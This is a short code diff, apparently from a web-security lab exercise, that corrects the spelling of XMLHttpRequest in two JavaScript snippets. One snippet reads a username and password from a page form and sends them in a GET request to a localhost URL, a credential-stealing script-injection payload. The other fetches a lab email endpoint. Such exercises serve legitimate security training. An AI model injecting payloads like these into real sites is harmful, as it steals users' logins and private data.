@@ -161,7 +161,7 @@ password = document.forms[0].elements[1].value;
 window.setTimeout(function() 
 
 {
-	var req = new XMLHTTPRequest();
+	var req = new XMLHttpRequest();
 	req.open("GET", "http://localhost/?username="+username+"&password="+password, true);
 	req.send();
 
@@ -174,7 +174,7 @@ window.setTimeout(function()
 
 <script>
 
-var req = new XMLHTTPRequest();
+var req = new XMLHttpRequest();
 req.onreadystatechange = function ()
 
 {
@@ -185,7 +185,7 @@ req.onreadystatechange = function ()
 	}
 };
 
-req.open("GET", "/lab/webapp/jfp/14/email", true);
+req.open("GET", "/lab/webapp/jfp/14/email?name=john", true);
 req.send();
 	
 </script>
